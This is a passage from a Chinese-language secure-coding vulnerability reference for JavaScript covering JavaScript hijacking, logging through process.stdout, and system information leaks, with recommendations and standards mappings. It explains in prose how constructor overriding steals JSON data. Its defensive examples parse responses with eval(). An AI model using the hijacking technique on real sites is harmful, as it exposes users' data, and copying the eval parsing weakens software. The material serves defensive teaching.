<p>当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 – 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。</p>
<p>这不是钓鱼攻击 – 攻击者未获得用户凭证的访问权限 – 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。</p>
<h5 id="RECOMMENDATIONS-9"><a href="#RECOMMENDATIONS-9" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有使用 JavaScript 进行通信的程序都应采取以下防范措施：1) 拒绝恶意请求：在每个返回给 JavaScript 的请求中都加入令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：在响应中加入一些字符，使其只有经过修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用 <code>&lt;script&gt;</code>标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。</p>
<p>拒绝恶意请求</p>
<p>从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。</p>
<p>有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。</p>
<p>示例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：</p>
<p>  var httpRequest = new XMLHttpRequest();</p>
<p>  …</p>
<p>  var cookies=”cookies=”+escape(document.cookie);</p>
<p>  http_request.open(‘POST’, url, true);</p>
<p>  httpRequest.send(cookies);</p>
<p>服务器也可以检查 HTTPreferer头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是<code>&lt;script&gt;</code>标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。</p>
<p>防止直接执行响应</p>
<p>为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用<code>&lt;script&gt;</code>标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过<code>&lt;script&gt;</code>标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。</p>
<p>示例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：</p>
<p>while(1);</p>
<p>除非客户端删除此前缀，否则对此消息求值会将 JavaScript 解释器置于一个无限循环中。客户端会搜索并删除如下前缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,9) == &quot;while(1);&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往eval()函数前删除。以下 JSON 对象已加入了一块注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>客户端可以搜索并删除如下注释字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,2) == &quot;/*&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(2, txt.length - 2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>任何通过<code>&lt;script&gt;</code>标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。</p>
<p>自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</p>
<h5 id="REFERENCES-9"><a href="#REFERENCES-9" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Chess, Y. O’Neil, and J. West JavaScript Hijacking </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001167 </p>
<p>[3] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2) </p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II </p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-003300 CAT II </p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II </p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II </p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-003300 CAT II </p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-003300 CAT II </p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-003300 CAT II </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-003300 CAT II </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-003300 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-003300 CAT II </p>
<p>[16] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Poor-Logging-Practice-Use-of-a-System-Output-Stream"><a href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream" class="headerlink" title="Poor Logging Practice: Use of a System Output Stream"></a>Poor Logging Practice: Use of a System Output Stream</h4><h5 id="ABSTRACT-10"><a href="#ABSTRACT-10" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 process.stdout 或 process.stderr 而不是专门的日志记录工具，会导致难以监控程序的运行状况。</p>
<h5 id="EXPLANATION-10"><a href="#EXPLANATION-10" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>示例 1：早期的 Node.js 开发人员可能会为了从 stdin 读取程序然后再将其写回 stdout 而编写的简单程序如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">process.stdin.on(&apos;readable&apos;, function()&#123;</span><br><span class="line"></span><br><span class="line">    var s = process.stdin.read();</span><br><span class="line"></span><br><span class="line">    if (s != null)&#123;</span><br><span class="line"></span><br><span class="line">      process.stdout.write(s);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>虽然大多数程序员继续学习，尤其是关于 JavaScript 和 Node.js 的细微之处，但很多程序员仍依赖于这一基础知识，始终使用 process.stdout.write() 编写标准输出的消息。</p>
<p>这里的问题是，直接在标准输出流或标准错误流中写入信息通常会作为一种非结构化日志记录形式使用。结构化日志记录系统提供了各种要素，如日志级别、统一的格式、日志标示符、次数统计，而且，可能最重要的是，将日志信息指向正确位置的功能。当系统输出流的使用与正确使用日志记录功能的代码混合在一起时，得出的结果往往是一个保存良好但缺少重要信息的日志。</p>
<p>开发者普遍认为需要使用结构化日志记录，但是很多人在“产前”的软件开发中仍使用系统输出流功能。如果您正在检查的代码是在开发阶段的初期生成的，那么对 process.stdout 或 process.stderr 的使用可能会在转向结构化日志记录系统的过程中导致漏洞。</p>
<h5 id="RECOMMENDATIONS-10"><a href="#RECOMMENDATIONS-10" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 Node.js 日志记录工具，而不使用 process.stdout 或 process.stderr。</p>
<p>示例 2：例如，应用程序可以按照以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">process.stdin.on(&apos;readable&apos;, function()&#123;</span><br><span class="line"></span><br><span class="line">  var s = process.stdin.read();</span><br><span class="line"></span><br><span class="line">  if (s !== null &amp;&amp; s !== undefined)&#123;</span><br><span class="line"></span><br><span class="line">    console.log(s);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这并不理想，因为它仍然只是基础信息，并不包含时间戳、进程 ID 或任何其他信息，而且会将用户控制的数据插入日志。使用诸如 “Winston” 或 “Bunyan” 之类的第三方库来进行日志记录是最佳方式，但如果您的特定情况只需要时间戳，则以下方法可能适用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">log = function(msg)&#123;</span><br><span class="line"></span><br><span class="line">  if (msg !== null &amp;&amp; msg !== undefined)&#123;</span><br><span class="line"></span><br><span class="line">    console.log(&apos;[&apos; + new Date() + &apos;] &apos; + msg);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">process.stdin.on(&apos;readable&apos;, function()&#123;</span><br><span class="line"></span><br><span class="line">  var s = process.stdin.read();</span><br><span class="line"></span><br><span class="line">  if (s !== null &amp;&amp; s !== undefined)&#123;</span><br><span class="line"></span><br><span class="line">    log(&quot;User input read&quot;);</span><br><span class="line"></span><br><span class="line">  &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    log(&quot;Waiting for user input&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-10"><a href="#REFERENCES-10" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398 </p>
<p>[2] Standards Mapping - FIPS200 AU </p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2) </p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling </p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7 </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[13] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<h4 id="System-Information-Leak"><a href="#System-Information-Leak" class="headerlink" title="System Information Leak"></a>System Information Leak</h4><h5 id="ABSTRACT-11"><a href="#ABSTRACT-11" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>显示系统数据或调试信息使攻击者能够使用系统信息来计划攻击。</p>
<h5 id="EXPLANATION-11"><a href="#EXPLANATION-11" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>示例 1：以下代码会将一个异常写入 AngularJS 中的浏览器控制台：</p>
<p><code>$log.log(exception);</code></p>
<p>根据异常的来源，这可能会向导致客户端出错的用户发送信息，或者可能向与服务器端信息相关的远程用户发送信息。</p>
<p>在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。</p>
<h5 id="RECOMMENDATIONS-11"><a href="#RECOMMENDATIONS-11" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据可帮助管理员和程序员诊断问题。调试踪迹有时可能出现在不明显的位置（例如，嵌入在错误页 HTML 的注释中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。因此，切勿将信息直接发送到程序外部的资源。</p>
<p>示例 2：以下代码会在从 AJAX 请求收到一个错误后写入一条通用消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var errorCallback = function(response)&#123;</span><br><span class="line"></span><br><span class="line">    if (response.status == 400)&#123;</span><br><span class="line"></span><br><span class="line">        $log.log(&apos;Service not found&apos;);</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        $log.log(&apos;Something went wrong attempting to reach the server&apos;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$http.get(&apos;/someUrl&apos;, config).then(successCallback, errorCallback);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-11"><a href="#REFERENCES-11" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 497 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001312, CCI-001314, CCI-002420 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.4 Output Encoding and Injection Prevention Requirements, 5.3.5 Output Encoding and Injection Prevention Requirements, 8.3.2 Sensitive Private Data, 8.3.4 Sensitive Private Data, 8.3.4 Sensitive Private Data, 14.3.1 Unintended Security Disclosure Requirements, 14.3.2 Unintended Security Disclosure Requirements, 14.3.3 Unintended Security Disclosure Requirements, 14.2.2 Dependency </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[15] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[33] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[34] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="System-Information-Leak-External"><a href="#System-Information-Leak-External" class="headerlink" title="System Information Leak: External"></a>System Information Leak: External</h4><h5 id="ABSTRACT-12"><a href="#ABSTRACT-12" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>显示系统数据或调试信息使攻击者能够使用系统信息来计划攻击。</p>
<h5 id="EXPLANATION-12"><a href="#EXPLANATION-12" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过套接字或网络连接使程序流向远程机器时，就会发生外部信息泄露。外部信息泄露会暴露有关操作系统、完整路径名、现有用户名或配置文件位置的特定数据，从而使攻击者有机可乘，它比内部信息（攻击者更难访问）泄露更严重。</p>
<p>示例 1：以下代码会在网页内文本区域中泄露异常信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">dirReader.readEntries(function(results)&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;, function(error)&#123;</span><br><span class="line"></span><br><span class="line">  $(&quot;#myTextArea&quot;).val(&apos;There was a problem: &apos; + error);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>该信息可能会显示给远程用户。在某些情况下，该错误消息会告诉攻击者该系统易遭受的确切攻击类型。例如，数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他错误消息可以揭示有关该系统的更多间接线索。在Example 1 中，泄露的信息可能会暗示有关操作系统类型、系统上安装了哪些应用程序以及管理员在配置程序时采取了哪些保护措施的信息。</p>
<h5 id="RECOMMENDATIONS-12"><a href="#RECOMMENDATIONS-12" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据可帮助管理员和程序员诊断问题。调试踪迹有时可能出现在不明显的位置（例如，嵌入在错误页 HTML 的注释中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。因此，切勿将信息直接发送到程序外部的资源。</p>
<h5 id="REFERENCES-12"><a href="#REFERENCES-12" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 215, CWE ID 489, CWE ID 497 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001312, CCI-001314, CCI-002420 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 8.3.4 Sensitive Private Data, 14.3.2 Unintended Security Disclosure Requirements, 14.3.3 Unintended Security Disclosure Requirements, 14.2.2 Dependency </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[15] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
